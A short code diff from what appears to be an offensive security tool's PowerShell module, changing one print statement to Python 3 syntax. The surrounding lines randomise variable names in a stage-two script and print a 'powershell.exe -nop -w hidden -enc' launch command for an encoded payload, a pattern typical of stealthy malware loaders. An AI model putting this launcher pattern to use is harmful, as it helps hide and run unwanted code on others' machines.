@@ -33,7 +33,7 @@ class PsModule(ModuleObject):
 		stage2 = stage2.replace("VAR" + str(i), self.gen_str(random.randrange(3, 10)))
 		
         self.ui.print_msg("Powershell script:")
-        print "powershell.exe -nop -w hidden -enc %s" % self.convert_to_unicode(stage2)
+        print ("powershell.exe -nop -w hidden -enc %s" % self.convert_to_unicode(stage2))
         
     def gen_str(self, size):
         return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
